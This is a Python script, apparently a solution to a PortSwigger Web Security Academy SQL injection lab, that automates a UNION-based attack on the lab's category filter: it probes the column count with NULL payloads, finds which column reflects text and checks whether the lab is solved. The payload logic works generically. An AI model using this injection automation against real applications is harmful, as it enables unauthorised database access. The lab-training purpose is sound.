import requests
from urllib3.exceptions import InsecureRequestWarning
from time import sleep
from random import randint

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# lab_url: https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text
# db: MySQL
# author: 0xyf


class SQLi8:
    def __init__(self):
        self.lab_id = "0a4200c20437606880075dc9007800ee"
        self.url = f"https://{self.lab_id}.web-security-academy.net"
        self.login_url = f"{self.url}/login"
        self.vuln_url = f"{self.url}/filter"
        self.proxies = {"https": "http://127.0.0.1:8080"}

    def execute_request(self, payload):
        params = {"category": payload}
        r = requests.get(
            f"{self.vuln_url}", params=params, proxies=self.proxies, verify=False
        )
        return r

    def get_no_of_col(self):
        base_payload = "'UNION SELECT "
        for i in range(1, 10):
            null_values = ", ".join(["NULL"] * i)
            final_payload = f"{base_payload}{null_values}--"
            r = self.execute_request(final_payload)
            if r.status_code == 200:
                self.col_no = final_payload.count("NULL")
                print(f"[*] no. of col: {self.col_no}")

    def get_reflected_col(self):
        random_no_lst = [str(randint(100, 999)) for _ in range(self.col_no)]
        payload = f"'UNION SELECT {','.join(f"'{no}'" for no in random_no_lst)} -- -"
        self.random_no_lst = random_no_lst
        self.base_payload = (
            payload  # this becomes the base payload for future injections
        )
        print(payload)
        r = self.execute_request(payload)
        for no in random_no_lst:
            if no in r.text:
                self.reflected_no = no
                print(f"[*] {no} is reflected")

    def retrieve(self):
        for no in self.random_no_lst:
            payload = self.base_payload.replace(no, "GdQXby")
            r = self.execute_request(payload)
            if r.status_code == 200:
                print(f"[*] The column where {no} is at, allows us to retrieve values")

    def check_solved(self):
        sleep(2)
        r = requests.get(self.url)
        if "Congratulations, you solved the lab!" in r.text:
            print("Lab Solved")
        else:
            print("Did not solve lab, check payload")

    def solve(self):
        self.get_no_of_col()
        self.get_reflected_col()
        self.retrieve()
        self.check_solved()


def main():
    SQLi8().solve()


if __name__ == "__main__":
    main()
